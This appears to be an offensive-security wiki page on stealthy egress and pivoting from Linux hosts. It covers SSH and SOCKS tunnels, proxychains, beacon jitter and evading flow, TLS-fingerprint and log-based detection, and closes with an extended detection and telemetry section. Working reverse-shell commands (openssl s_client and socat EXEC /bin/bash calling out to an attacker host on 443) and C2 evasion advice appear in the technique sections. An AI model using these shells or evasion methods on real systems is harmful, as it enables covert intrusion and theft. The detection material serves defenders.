---
title: "Network Stealth & Tunneling"
parent: "1. Linux"
nav_order: 6
---

# Linux Network Stealth & Tunneling

*Quiet egress and pivoting on Linux: choosing protocols that match the host baseline, building SSH and SOCKS tunnels that survive scrutiny, and understanding the NetFlow, Zeek, and TLS-fingerprint trail every connection leaves.*

## What & why

The goal is to move command-and-control traffic and pivot deeper into a network without generating a connection that stands out from the host's normal behavior. Every new outbound flow is recorded somewhere - a NetFlow/IPFIX exporter on the router, a Zeek `conn.log` on a tap, a forward-proxy access log, a DNS resolver log. You cannot avoid being logged; you can only avoid being *anomalous*. The OPSEC rationale is blending: a beacon to 203.0.113.10:4444 over raw TCP is one grep away, while a long-lived TLS session to 443 that rides the same destinations and JA3 profile as the host's existing traffic forces the defender into behavioral analysis instead of signature matching. This page treats the network as adversarial telemetry by default and optimizes egress to look like the host already looked yesterday. Pair it with [C2 infrastructure](../c2-infrastructure/) for the server side and [data transfer](../data-transfer/) for exfil shaping.

## Technique

### Egress selection: profile the host before you pick a port

Before opening anything outbound, enumerate what egress the host already uses and what intermediaries sit in the path. The cheapest tell to avoid is a destination port or protocol the host has never spoken before.

```bash
# Established connections and their remote ports (reading state, no new sockets)
ss -tnp state established
ss -tnp state established '( dport = :443 )'    # how much 443 is already in use

# Proxy configuration the environment expects you to honor
env | grep -iE 'http_proxy|https_proxy|no_proxy|all_proxy'
cat /etc/environment 2>/dev/null
grep -rIs 'proxy' /etc/profile.d/ /etc/apt/apt.conf.d/ /etc/yum.conf 2>/dev/null

# What the host resolves through, and whether DNS is centralized
cat /etc/resolv.conf
resolvectl status 2>/dev/null       # systemd-resolved per-link servers

# What ports are reachable outbound at all (probe sparingly, see OPSEC notes)
for p in 443 53 80; do
  timeout 3 bash -c ">/dev/tcp/198.51.100.20/$p" 2>/dev/null && echo "open: $p"
done
```

Decision rules that keep you inside the baseline:

- If `http_proxy`/`https_proxy` is set, the environment funnels egress through a forward proxy. Honoring it means your traffic appears in the proxy log alongside everyone else; *bypassing* it (direct 443 to the internet from a host that normally cannot route directly) is itself the anomaly. Route C2 through the same proxy via `CONNECT`.
- Prefer 443/TCP to a destination that resembles a CDN or SaaS endpoint the org already touches. Reusing an in-baseline destination ASN beats a fresh VPS in a hosting ASN no one in the org has ever contacted.
- 53/UDP and 53/TCP (DNS) is attractive when direct egress is blocked, but DNS tunneling is loud in volume and entropy - see Detection.
- Never pick memorable C2 ports: 4444, 1337, 8080-on-a-server-that-only-talks-443, 9001. These are the first `dport` values a hunter pivots on.

### SSH tunneling: local, remote, and dynamic forwards

SSH gives you encrypted, authenticated, multiplexed transport with three forwarding modes. All three ride a single TCP/22 (or whatever port the jump host listens on) connection.

```bash
# Local forward: bind a local port, send it to a host reachable from the SSH server.
# Reach an internal DB at 192.0.2.50:5432 through bastion 198.51.100.10.
ssh -f -N -L 127.0.0.1:15432:192.0.2.50:5432 operator@198.51.100.10
#   -f  background after auth (no shell)        -N  no remote command
#   bind to 127.0.0.1 (not 0.0.0.0) so the forward is not itself a new listener others can hit

# Remote forward: expose a service on the attacker side, reachable FROM the SSH server's network.
# Used for reverse pivots when the internal host cannot be reached inbound.
ssh -f -N -R 127.0.0.1:18080:127.0.0.1:8080 operator@198.51.100.10
#   GatewayPorts must be 'yes' on the server to bind non-loopback on the remote side

# Dynamic forward: a SOCKS5 proxy on the client; the SSH server resolves and connects per-request.
ssh -f -N -D 127.0.0.1:1080 operator@198.51.100.10
#   now point tooling at socks5h://127.0.0.1:1080  (the 'h' makes DNS resolve server-side)
```

ProxyJump chains through intermediate hosts without leaving a shell on each hop, so the operator workstation talks only to the first bastion and each subsequent hop is a nested SSH inside the prior channel.

```bash
# Three-hop chain. Each -J host only ever sees a connection from the host before it.
ssh -J operator@198.51.100.10,svc@192.0.2.20 deep@192.0.2.99
```

Multiplexing with `ControlMaster` collapses many SSH sessions into one TCP connection, which means one NetFlow record instead of N and one auth event instead of N. New sessions ride the existing master socket and never re-authenticate on the wire.

```bash
# ~/.ssh/config
Host bastion
    HostName 198.51.100.10
    User operator
    ControlMaster auto
    ControlPath ~/.ssh/cm-%r@%h:%p
    ControlPersist 10m
    ServerAliveInterval 60      # keepalive shaping, see OPSEC
    ServerAliveCountMax 3
```

```bash
# First connection opens the master; subsequent ones are instant and silent on the wire.
ssh -f -N bastion
ssh bastion 'id'          # reuses the master, no new TCP/22 flow, no new auth log line on server
ssh -O check bastion      # confirm the control socket is live
ssh -O exit  bastion      # tear the master down cleanly
```

Important: SSH connections are logged at **both ends**. The client records nothing useful by default, but the server's `sshd` writes an `Accepted publickey/password for <user> from <ip> port <p>` line to the auth log (`/var/log/auth.log` on Debian, `/var/log/secure` on RHEL, plus the systemd journal). A pivot through a host you do not control means your source IP and username are now in someone's SIEM. Multiplexing reduces the count of those lines but never eliminates the first one.

### proxychains over a SOCKS pivot

With a `-D` SOCKS proxy up, route non-proxy-aware tools through it. Prefer `proxychains4` (proxychains-ng).

```ini
# /etc/proxychains4.conf  (or a local copy passed with -f)
strict_chain
proxy_dns                       # resolve through the chain, do NOT leak DNS locally
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5  127.0.0.1 1080
```

```bash
proxychains4 -q nmap -sT -Pn -n -p 445,3389 192.0.2.0/24
proxychains4 -q curl -s http://192.0.2.50/internal/
```

Two tells to control here. First, `proxychains` only intercepts TCP `connect()` via `LD_PRELOAD`, so any tool that sends raw UDP, ICMP, or does a SYN scan (`nmap -sS` needs root and raw sockets that bypass the hook) will either fail or leak around the proxy with your real source IP. Use full-connect scans (`-sT`) only. Second, `proxychains` with `proxy_dns` off leaks DNS resolution to the local resolver, creating lookups for internal hostnames from the wrong host - keep `proxy_dns` on.

### Reverse shells that look like normal TLS

A raw `bash -i >& /dev/tcp/...` reverse shell over an odd port is the canonical loud artifact. Wrap the channel in real TLS so the bytes on the wire are an encrypted handshake to 443, not cleartext shell prompts.

```bash
# Listener (attacker, 198.51.100.10): generate a cert, then serve TLS.
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem \
  -days 30 -nodes -subj "/CN=cdn.example.com"
openssl s_server -quiet -key key.pem -cert cert.pem -accept 443
```

```bash
# Target: connect out over TLS to 443 and hand a shell to the encrypted channel.
mkfifo /tmp/.s
/bin/sh -i < /tmp/.s 2>&1 | \
  openssl s_client -quiet -connect 198.51.100.10:443 > /tmp/.s
rm /tmp/.s
```

`socat` with the OpenSSL address gives a cleaner, more stable channel and lets you pin a fingerprint:

```bash
# Listener
socat OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,verify=0,fork -

# Target (verify=0 here only because of a self-signed lab cert; pin in real use)
socat OPENSSL:198.51.100.10:443,verify=0 EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane
```

Why this is quieter than `nc`: the payload is inside a TLS record, so a packet-content IDS sees a handshake and ciphertext rather than `uid=0(root)`. It does *not* hide the flow metadata - destination, port, byte counts, and TLS fingerprint are all still exported. Avoid raw TCP reverse shells entirely on monitored networks; cleartext shell banners and ANSI prompts in a payload are trivially signatured by Zeek/Suricata.

### Traffic timing, jitter, and keepalive shaping

Beaconing periodicity is the single most reliable behavioral tell. A connection or callback that fires every 60.0 seconds for hours is a textbook detection. Two defensive moves:

- **Jitter**: randomize sleep intervals by a large percentage (for example 60s base with +/- 40% jitter) so the inter-arrival histogram smears instead of spiking.
- **Long-lived sessions over polling**: a single persistent TLS session with traffic only when there is work produces one flow, not a repeating series of short flows. This trades one detection class (periodic short connections) for another (an unusually long-lived flow), so size the trade against the baseline - if the host normally holds long TLS sessions to SaaS, a long session blends; if it normally makes short bursts, mimic bursts with jitter.

`ServerAliveInterval`/`ServerAliveCountMax` on SSH and TCP keepalive shaping keep an idle tunnel from being torn down by a stateful firewall idle timeout, but a fixed keepalive interval is itself a periodic signal. Set it just under the firewall idle timeout, not to a round number.

### ss vs netstat, and what actually gets logged

Use `ss` (iproute2, reads `/proc/net/*` and the `sock_diag` netlink interface) rather than the deprecated `netstat`. Neither tool *writes* a log - they read kernel socket state. The connections they show, however, are recorded by the kernel's connection tracker and by any flow exporter:

```bash
ss -tanp                     # all TCP, numeric, with owning process
ss -tnp state established
ss -o state established '( dport = :443 )'   # -o shows timers (keepalive/retransmit)
ss -s                        # socket summary counts
```

```bash
# conntrack holds every tracked flow in kernel; it is queryable and is what NAT/NetFlow derive from
conntrack -L 2>/dev/null | grep -E 'dport=443|dport=53'
cat /proc/net/nf_conntrack 2>/dev/null
```

The lesson: hiding a process from `ss` output (for example by abusing a tool that filters `/proc`) does nothing about conntrack state, NAT translations, or the NetFlow record the upstream router already exported. The flow exists at layer 3/4 regardless of what the host's userland reports.

### Binding to existing listeners vs opening new ones

Opening a new listening socket on the host creates a new `LISTEN` state, a new line in `ss -ltnp`, and frequently a Sysmon-for-Linux or auditd record of the `bind()`/`listen()` syscalls. Where possible, ride an existing listener (reverse forward into a service the host already exposes) rather than standing up a fresh port. If you must listen, bind to `127.0.0.1` so the socket is not reachable - and not scannable - from the network, and reuse a port number consistent with the host role.

## OPSEC notes

What makes the loud version loud:

- **Odd destination port**: 4444/1337/9001 etc. A `dport` filter in any NetFlow tool surfaces these instantly.
- **Cleartext payload**: raw TCP reverse shells carry shell prompts and command output in the clear; content IDS signatures (Suricata/Snort) match them with near-zero false positives.
- **Fresh, rare destination**: first-ever connection from the estate to a hosting-ASN IP. "New outbound to rare external destination" is a standard hunt.
- **Periodicity**: fixed-interval callbacks. Flow analytics detect the regular inter-arrival time even when content is encrypted.
- **Direct egress where a proxy is mandated**: bypassing the corporate proxy is more anomalous than using it.
- **New LISTEN sockets** on non-standard ports, and SYN scans that light up the conntrack table and trigger sweep detection.

The quiet variant: 443/TCP to an in-baseline destination ASN, TLS-wrapped payload, jittered or session-held timing, routed through the mandated proxy, multiplexed to minimize flow and auth counts, source-port and TLS fingerprint chosen to resemble the host's normal client stack.

Failure modes and tells:

- TLS fingerprint mismatch: an OpenSSL/socat client has a JA3/JA4 that differs from the host's browser or system libraries. A host whose 443 traffic suddenly carries a never-seen JA3 is flagged even though the destination and port look fine.
- DNS leakage: `proxychains` without `proxy_dns`, or SOCKS without the `h` (`socks5h`), resolves internal names locally and creates lookups from the wrong host.
- SSH server-side logging: every first auth lands in the jump host's auth log and journal with your source IP and username.
- Keepalive periodicity: a fixed `ServerAliveInterval` is a low-rate but perfectly regular beacon.
- conntrack and NetFlow persist the flow even if you scrub host-side socket visibility.

## Detection & telemetry

This is where the defender wins or loses. The flow metadata survives encryption; hunt on it.

### NetFlow / IPFIX (router, firewall, flow exporter)

Per-flow records: source/destination IP, source/destination port, protocol, byte and packet counts, start/end timestamps, TCP flags. Detection logic:

- **New outbound to rare external destination**: flows where the destination IP/ASN has never (or rarely) been contacted by the estate in a baseline window. Weight by destination ASN reputation (hosting/VPS ASNs score higher).
- **Odd destination ports**: any outbound flow with `dport` not in the host-role allowlist (a workstation that suddenly speaks 4444 outbound).
- **Beaconing**: group flows by `(src, dst, dport)`, compute inter-arrival deltas, and flag low variance (a tight standard deviation of the interval) over a sustained window. This catches encrypted C2 by timing alone. Tools: RITA, Zeek + custom analytics, commercial NDR.
- **Long-lived / high-duration flows** to a single external destination, and asymmetric byte ratios consistent with C2 (small request, larger response, or steady small bidirectional chatter).

### Zeek

- `conn.log`: `id.orig_h`, `id.resp_h`, `id.resp_p`, `proto`, `service`, `duration`, `orig_bytes`, `resp_bytes`, `conn_state`, `history`. Pivot on `id.resp_p` for odd ports, `duration` for long sessions, `history` for unusual TCP state machines.
- `ssl.log`: `version`, `cipher`, `server_name` (SNI), `ja3`, `ja3s`, `validation_status`. A self-signed cert (`validation_status` not `ok`) on a "443 to a CDN" flow is a strong tell, as is an SNI that does not match the cert CN.
- `dns.log`: query, qtype, answers. DNS tunneling shows as high query volume to one zone, long labels, high subdomain entropy, and a high ratio of `TXT`/`NULL`/`CNAME` qtypes.
- `x509.log`: certificate subject/issuer for the self-signed-cert hunt above.

```
# Zeek conn.log: top destination ports for a suspect host (zeek-cut)
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p service duration \
  | awk '$1=="192.0.2.99"' | sort | uniq -c | sort -rn

# Zeek ssl.log: sessions with a non-ok validation status (self-signed C2)
cat ssl.log | zeek-cut id.orig_h id.resp_h server_name ja3 validation_status \
  | awk '$5!="ok"'
```

### JA3 / JA4 TLS fingerprints

JA3 hashes the client hello (version, cipher list, extensions, elliptic curves, EC point formats); JA4 is the successor with a more structured, more robust fingerprint. The OpenSSL CLI, socat, Python `ssl`, and Go each produce a distinct, well-known JA3/JA4. Defenders maintain allowlists of expected client fingerprints per host role; an out-of-profile JA3 on egress 443 is the signature that catches TLS-wrapped shells even when destination and port are clean.

### SSH authentication logs (jump host)

`sshd` writes to `/var/log/auth.log` (Debian/Ubuntu) or `/var/log/secure` (RHEL/CentOS) and to the systemd journal (`journalctl -u ssh` / `-u sshd`).

- `Accepted publickey for <user> from <ip> port <n> ssh2` - source IP and key fingerprint of every successful login.
- `Failed password` / `Invalid user` - bursts indicate spraying.
- With multiplexing, only the master connection produces an `Accepted` line; absence of expected per-session auth on a host that shows heavy SSH child activity can itself be a hunt (one auth, many sessions).

```
# Sigma-style intent: successful SSH from an internal host that has never logged in before
logsource: { product: linux, service: sshd }
detection:
  sel: { 'Accepted': '*for*from*' }
  condition: sel and not baseline_source_ip
```

### auditd (host syscall layer)

auditd records the syscalls behind socket activity. Rules to surface connect/bind from unexpected binaries:

```
# /etc/audit/rules.d/net.rules  (arch lines for 64-bit; add b32 for 32-bit hosts)
-a always,exit -F arch=b64 -S connect -F a2=16 -F success=1 -F key=net_connect
-a always,exit -F arch=b64 -S bind    -F success=1 -F key=net_bind
-a always,exit -F arch=b64 -S socket  -F a0=10 -F key=net_socket6   # AF_INET6
```

Search and correlate the resulting `SYSCALL`/`SOCKADDR` records by key, then map back to the executing binary (`exe=`, `comm=`):

```bash
ausearch -k net_connect -i | grep -E 'comm="(socat|openssl|ssh|nc|ncat|proxychains4)"'
ausearch -k net_bind -i
```

Note: high-volume `connect` auditing is noisy on busy hosts; scope by `comm`/`exe` or by non-standard ports rather than logging every connect.

### Sysmon for Linux

Sysmon for Linux emits `Event ID 3 (Network connection)` with process image, user, source/destination IP and port, and protocol. Hunt for `Image` values like `openssl`, `socat`, `ssh`, `ncat` making outbound 443 from contexts that should not, and for non-standard destination ports. `Event ID 1 (Process creation)` captures the full command line, so `ssh -L/-R/-D`, `socat OPENSSL:`, and `proxychains4` invocations are recoverable from process telemetry even when the network bytes are encrypted.

### osquery / Fleet

```sql
-- Established outbound connections with owning process and port
SELECT pos.pid, p.name, p.path, pos.remote_address, pos.remote_port, pos.local_port
FROM process_open_sockets pos
JOIN processes p USING (pid)
WHERE pos.remote_port NOT IN (80, 443, 53)
  AND pos.remote_address NOT LIKE '127.%'
  AND pos.remote_address NOT LIKE '10.%'
  AND pos.remote_address != '';

-- Listening sockets that are not bound to loopback (new listeners)
SELECT pid, p.name, l.address, l.port
FROM listening_ports l JOIN processes p USING (pid)
WHERE l.address NOT IN ('127.0.0.1', '::1', '');
```

### DNS resolver logs

Centralized resolver or `dnsmasq`/`unbound` query logs reveal tunneling and proxy DNS leaks: sudden per-host query volume spikes, long encoded labels, high subdomain cardinality under one zone, and unusual qtype distributions (`TXT`/`NULL`). Cross-reference resolver logs with NetFlow - a host generating large DNS volume but little corresponding web traffic is suspect.

### Forward-proxy deny/allow logs

A mandated proxy logs every `CONNECT`/`GET` with client IP, destination host, bytes, and result. Detections: `CONNECT` to a destination not in the corporate category allowlist, repeated `CONNECT` to a single uncategorized/hosting IP (beaconing through the proxy), and - critically - flows the proxy *never sees* that the firewall does (direct egress that bypassed the mandated proxy is the anomaly). See [detection mapping](../detection-mapping/) for how these sources stitch together.

## MITRE ATT&CK

- T1071.001 - Application Layer Protocol: Web Protocols
- T1071.004 - Application Layer Protocol: DNS
- T1572 - Protocol Tunneling
- T1090.001 - Proxy: Internal Proxy
- T1090.002 - Proxy: External Proxy
- T1573.001 - Encrypted Channel: Symmetric Cryptography
- T1573.002 - Encrypted Channel: Asymmetric Cryptography
- T1095 - Non-Application Layer Protocol
- T1571 - Non-Standard Port
- T1008 - Fallback Channels
- T1029 - Scheduled Transfer (beacon timing/jitter relevance)

## References

- ssh(1), ssh_config(5), sshd(8) man pages - OpenSSH forwarding, ProxyJump, ControlMaster - https://man.openbsd.org/ssh
- ss(8) man page (iproute2) - https://man7.org/linux/man-pages/man8/ss.8.html
- socat(1) man page - OPENSSL and EXEC addresses - http://www.dest-unreach.org/socat/doc/socat.html
- proxychains-ng - https://github.com/rofl0r/proxychains-ng
- MITRE ATT&CK - Protocol Tunneling (T1572), Proxy (T1090), Non-Standard Port (T1571) - https://attack.mitre.org/techniques/T1572/
- Zeek documentation - conn.log, ssl.log, dns.log, JA3 plugin - https://docs.zeek.org/en/master/logs/
- Salesforce JA3 and FoxIO JA4 TLS fingerprinting - https://github.com/salesforce/ja3 , https://github.com/FoxIO-LLC/ja4
- RITA - Real Intelligence Threat Analytics, beaconing detection over Zeek data - https://github.com/activecm/rita
- Linux audit system - auditctl(8) and audit rules - https://man7.org/linux/man-pages/man8/auditctl.8.html
- Sysmon for Linux - https://github.com/Sysinternals/SysmonForLinux
